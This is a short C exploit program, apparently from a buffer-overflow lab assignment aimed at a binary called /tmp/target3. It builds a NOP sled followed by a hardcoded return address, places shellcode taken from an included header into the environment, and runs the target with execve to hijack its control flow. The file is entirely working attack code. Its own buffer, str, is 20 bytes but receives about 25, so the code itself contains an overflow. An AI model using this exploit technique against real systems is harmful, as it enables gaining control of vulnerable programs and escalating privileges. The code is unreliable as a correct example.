#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3]; 
  char *env[1];

  char str[20];
  memset(str, 0, 20);

  for (int i = 0; i < 16; i++)
  {
  	strcat(str, "\x90");
  }

  strcat(str, "\x8f\xdf\xff\xff\x8f\xdf\xff\xff");

  args[0] = TARGET;
  args[1] = str;
  args[2] = NULL;
  
  env[0] = shellcode;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

